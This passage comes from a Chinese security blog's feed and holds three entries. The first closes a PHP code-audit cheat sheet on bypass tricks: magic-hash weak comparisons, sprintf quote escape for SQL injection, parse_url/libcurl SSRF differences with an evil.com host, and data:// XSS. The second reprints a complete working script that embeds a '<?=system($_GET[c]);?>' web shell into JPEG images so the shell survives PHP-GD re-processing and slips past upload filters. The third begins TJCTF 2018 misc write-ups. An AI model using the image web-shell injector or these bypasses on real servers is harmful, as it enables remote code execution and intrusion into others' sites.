unlink($filename);}?&gt;</code></pre><blockquote><p>查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。<br>我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。<br> 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p></blockquote><p>于是乎linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除,此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除</p><h2 id="extract-、parse-str-等变量覆盖"><a href="#extract-、parse-str-等变量覆盖" class="headerlink" title="extract()、parse_str() 等变量覆盖"></a>extract()、parse_str() 等变量覆盖</h2><p>extract函数从数组导入变量（如\$_GET、 \$_POST）,将数组的键名作为变量的值。而parse_str函数则是从类似name=Bill&amp;age=60的格式字符串解析变量.如果在使用第一个函数没有设置EXTR_SKIP或者EXTR_PREFIX_SAME等处理变量冲突的参数时、第二个函数没有使用数组接受变量时将会导致变量覆盖的问题</p><h2 id="intval-整数溢出、向下取整和整形判断的问题"><a href="#intval-整数溢出、向下取整和整形判断的问题" class="headerlink" title="intval()整数溢出、向下取整和整形判断的问题"></a>intval()整数溢出、向下取整和整形判断的问题</h2><pre><code>32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807</code></pre><p>​ 因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647</p><pre><code>此外intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\0）时结束转换</code></pre><h2 id="浮点数精度问题导致的大小比较问题"><a href="#浮点数精度问题导致的大小比较问题" class="headerlink" title="浮点数精度问题导致的大小比较问题"></a>浮点数精度问题导致的大小比较问题</h2><p>当小数小于10^-16后，PHP对于小数就大小不分了<br>var_dump(1.000000000000000 == 1) &gt;&gt; TRUE<br>var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</p><h2 id="is-numeric-与intval-特性差异"><a href="#is-numeric-与intval-特性差异" class="headerlink" title="is_numeric()与intval()特性差异"></a>is_numeric()与intval()特性差异</h2><pre><code>is_numeric函数在判断是否是数字时会忽略字符串开头的’ ‘、’\t’、’\n’、’\r’、’\v’、’\f’。</code></pre><p>​ 而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\r\n\t 0.1e2”) &gt;&gt; TRUE</p><pre><code>intval()函数会忽略’’ ‘\n’、’\r’、’\t’、’\v’、’\0’ ，也就是说intval(“\r\n\t 12”) &gt;&gt; 12</code></pre><h2 id="strcmp-数组比较绕过"><a href="#strcmp-数组比较绕过" class="headerlink" title="strcmp()数组比较绕过"></a>strcmp()数组比较绕过</h2><p>int strcmp ( string $ str1 , string \$str2 )</p><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；</p><p>如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>但是如果传入的两个变量是数组的话，函数会报错返回NULL，如果只是用strcmp()==0来判断的话就可以绕过</p><h2 id="sha1-、md5-函数传入数组比较绕过"><a href="#sha1-、md5-函数传入数组比较绕过" class="headerlink" title="sha1()、md5() 函数传入数组比较绕过"></a>sha1()、md5() 函数传入数组比较绕过</h2><p>sha1（） MD5（）函数默认接收的参数是字符串类型，但是如果如果传入的参数是数组的话，函数就会报错返回NULL。类似sha1(\$_GET[‘name’]) === sha1(\$_GET[‘password’])的比较就可以绕过</p><h2 id="弱类型-比较绕过"><a href="#弱类型-比较绕过" class="headerlink" title="弱类型==比较绕过"></a>弱类型==比较绕过</h2><p>这方面问题普及的很多，不作过多的解释</p><pre><code>md5(‘240610708’); // 0e462097431906509019562988736854md5(‘QNKCDZO’); // 0e830400451993494058024219903391md5(‘240610708’) == md5(‘QNKCDZO’)md5(‘aabg7XSs’) == md5(‘aabC9RqS’)sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’)sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’)‘0010e2’ == ‘1e3’‘0x1234Ab’ == ‘1193131‘‘0xABCdef’ == ‘ 0xABCdef’当转换为boolean时，以下只被认为是FALSE：FALSE、0、0.0、“”、“0”、array()、NULLPHP 7 以前的版本里，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略。var_dump(0123)=var_dump(01239)=83PHP 7 以后，会产生 Parse Error。字符串转换为数值时，若字符串开头有数字，则转为数字并省略后面的非数字字符。若一开头没有数字则转换为0\$foo = 1 + “bob-1.3e3”; // $foo is integer (1)\$foo = 1 + “bob3”; // $foo is integer (1)\$foo = 1 + “10 Small Pigs”; // $foo is integer (11)‘’ == 0 == false‘123’ == 123‘abc’ == 0‘123a’ == 123‘0x01’ == 1‘0e123456789’ == ‘0e987654321’[false] == [0] == [NULL] == [‘’]NULL == false == 0» true == 1</code></pre><h2 id="eregi-匹配绕过"><a href="#eregi-匹配绕过" class="headerlink" title="eregi()匹配绕过"></a>eregi()匹配绕过</h2><p>eregi（）默认接收字符串参数，如果传入数组，函数会报错并返回NULL。同时还可以%00 截断进行绕过</p><h2 id="PHP变量名不能带有点-和空格，否则在会被转化为下划线"><a href="#PHP变量名不能带有点-和空格，否则在会被转化为下划线" class="headerlink" title="PHP变量名不能带有点[.] 和空格，否则在会被转化为下划线[_]"></a>PHP变量名不能带有点[.] 和空格，否则在会被转化为下划线[_]</h2><pre><code>parse_str(&quot;na.me=admin&amp;pass wd=123&quot;,$test);var_dump($test); array(2) {  [&quot;na_me&quot;]=&gt;  string(5) &quot;admin&quot;  [&quot;pass_wd&quot;]=&gt;  string(3) &quot;123&quot;}</code></pre><p>PS：通过$_SERVER[‘REQUEST_URI’]方式获得的参数不会进行转换</p><h2 id="REQUEST是直接从GET，POST-和-COOKIE中取值，不是他们的引用。即使后续GET，POST-和-COOKIE发生了变化，也不会影响-REQUEST的结果"><a href="#REQUEST是直接从GET，POST-和-COOKIE中取值，不是他们的引用。即使后续GET，POST-和-COOKIE发生了变化，也不会影响-REQUEST的结果" class="headerlink" title="\$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果"></a>\$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果</h2><p>php在遇到相同参数时接受的是第二个参数<br>in_arrary()函数默认进行松散比较（进行类型转换）</p><pre><code>in_arrary(“1asd”,arrart(1,2,3,4))    =&gt; truein_arrary(“1asd”,arrart(1,2,3,4),TRUE)    =&gt; false   \\(需要设置strict参数为true才会进行严格比较，进行类型检测)</code></pre><p>htmlspecialchars()函数默认只转义双引号不转义单引号，如果都转义的话需要添加上参数ENT_QUOTES<br>在php4、php&lt;5.2.1中，变量的key值不受magic_quotes_gpc影响<br>sprintf()格式化漏洞（可以吃掉转义后的单引号）<br>printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能<br>例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉\ 斜杠）<br>同时sprintf（）可以使用指定参数位置的写法</p><pre><code>&lt;?php$format  = &apos;This %2$s contains %1$04d monkeys&apos;;echo sprintf($format,$num,$location);?&gt;以上实例会输出:The tree contains 0005 monkeys</code></pre><p>%后面的数字代表第几个参数，$后代表格式化类型<br>于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时<br>例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了<br>还有一种情况就是’被转义成了\’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\’<br>于是sql语句变成了 select * from user where username = ‘%\’ and 1=1#’;<br>如果这个语句被使用sprintf函数进行了拼接，%后的\被吃掉了，导致了’逃逸</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos;?&gt;</code></pre><p>不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错<br>这个时候我们可以使用%1$来吃掉转移添加的\</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%1$\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;;?&gt;</code></pre><h2 id="php中-赋值运算的优先级高于and"><a href="#php中-赋值运算的优先级高于and" class="headerlink" title="php中 = 赋值运算的优先级高于and"></a>php中 = 赋值运算的优先级高于and</h2><p>$c = is_numeric($a) and is_numeric($b) 程序本意是要a、b都为数字才会继续，但是当\$a为数字时，会先赋值给\$c，所以可能导致$b绕过检测</p><h2 id="parse-url与libcurl对与url的解析差异可能导致ssrf"><a href="#parse-url与libcurl对与url的解析差异可能导致ssrf" class="headerlink" title="parse_url与libcurl对与url的解析差异可能导致ssrf"></a>parse_url与libcurl对与url的解析差异可能导致ssrf</h2><pre><code>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对http://user@eval.com:80@baidu.com 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是`evil@baidu.com`，但是libcurl获取的host却是evil.com</code></pre><h2 id="url标准的灵活性导致绕过filter-var与parse-url进行ssrf"><a href="#url标准的灵活性导致绕过filter-var与parse-url进行ssrf" class="headerlink" title="url标准的灵活性导致绕过filter_var与parse_url进行ssrf"></a>url标准的灵活性导致绕过filter_var与parse_url进行ssrf</h2><p>filter_var()函数对于<a href="http://evil.com;google.com" target="_blank" rel="noopener">http://evil.com;google.com</a> 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\google.com:80/却返回true。</p><h2 id="通过file-get-contents获取网页内容并返回到客户端有可能造成xss"><a href="#通过file-get-contents获取网页内容并返回到客户端有可能造成xss" class="headerlink" title="通过file_get_contents获取网页内容并返回到客户端有可能造成xss"></a>通过file_get_contents获取网页内容并返回到客户端有可能造成xss</h2><p>例如如下代码</p><pre><code>if(filter_var($argv[1], FILTER_VALIDATE_URL)) {   // parse URL   $r = parse_url($argv[1]);   print_r($r);   // check if host ends with google.com   if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) {      // get page from URL      $a = file_get_contents($argv[1]);      echo($a);   } else {      echo &quot;Error: Host not allowed&quot;;   }} else {   echo &quot;Error: Invalid URL&quot;;}</code></pre><p>虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定<br>但是可以通过<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code>页面会将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>返回给客户端，就有可能造成xss</p><h2 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h2><p>construct():当一个类被创建时自动调用<br>destruct():当一个类被销毁时自动调用<br>invoke():当把一个类当作函数使用时自动调用<br>tostring():当把一个类当作字符串使用时自动调用<br>wakeup():当调用unserialize()函数时自动调用<br>sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-PHP敏感配置项&quot;&gt;&lt;a href=&quot;#0x01-PHP敏感配置项&quot; class=&quot;headerlink&quot; title=&quot;0x01 PHP敏感配置项&quot;&gt;&lt;/a&gt;0x01 PHP敏感配置项&lt;/h1&gt;&lt;h2 id=&quot;register-globals-php版
      
    
    </summary>
    
    
      <category term="php" scheme="https://threst.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpgd绕过</title>
    <link href="https://threst.github.io/2018/10/04/phpgd%E7%BB%95%E8%BF%87/"/>
    <id>https://threst.github.io/2018/10/04/phpgd绕过/</id>
    <published>2018-10-04T05:34:11.000Z</published>
    <updated>2018-10-04T07:05:11.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $miniPayload = <span class="string">'&lt;?=system($_GET[c]);?&gt;'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="安装php-gd"><a href="#安装php-gd" class="headerlink" title="安装php-gd"></a>安装php-gd</h2><p><code>sudo apt-get install php-gd &amp;&amp; sudo service apache2 restart</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="php" scheme="https://threst.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>tjctf2018wp</title>
    <link href="https://threst.github.io/2018/10/04/tjctf2018misc/"/>
    <id>https://threst.github.io/2018/10/04/tjctf2018misc/</id>
    <published>2018-10-04T05:34:10.000Z</published>
    <updated>2018-10-04T07:22:32.380Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Trippy"><a href="#Trippy" class="headerlink" title="Trippy"></a>Trippy</h2><p><code>strings be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif | grep tjctf</code></p><h2 id="Interference"><a href="#Interference" class="headerlink" title="Interference"></a>Interference</h2><p>1.将v1和v2用stegsolve<code>add</code>下，保存图片，在改变图片的偏移量，找到黑白的二维码，用windows反色，扫描出flag<br>2.<code>compare v1.png v2.png output.png</code>再把output.png用stegsolve调至黑白，windows反色.</p><h2 id="Grid-Parser"><a href="#Grid-Parser" class="headerlink" title="Grid Parser"></a>Grid Parser</h2><ol><li>解压文件，发现有个<code>password.png</code>，用<code>binwalk</code>提取出zip，使用<code>fcrackzip --brute-force --charset a1 --length 1-3 --use-unzip xxxx.zip</code>，爆破出密码为<code>px</code></li></ol><h2 id="Weird-Logo"><a href="#Weird-Logo" class="headerlink" title="Weird Logo"></a>Weird Logo</h2><p>直接stegsolve</p><h2 id="Lexington-State-Bank"><a href="#Lexington-State-Bank" class="headerlink" title="Lexington State Bank"></a>Lexington State Bank</h2><p>安装zsteg<br><code>gem install zsteg</code><br>直接命令<code>zsteg lsb.png</code></p><h2 id="Huuuuuge"><a href="#Huuuuuge" class="headerlink" title="Huuuuuge"></a>Huuuuuge</h2><p>nmap扫描<br>结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 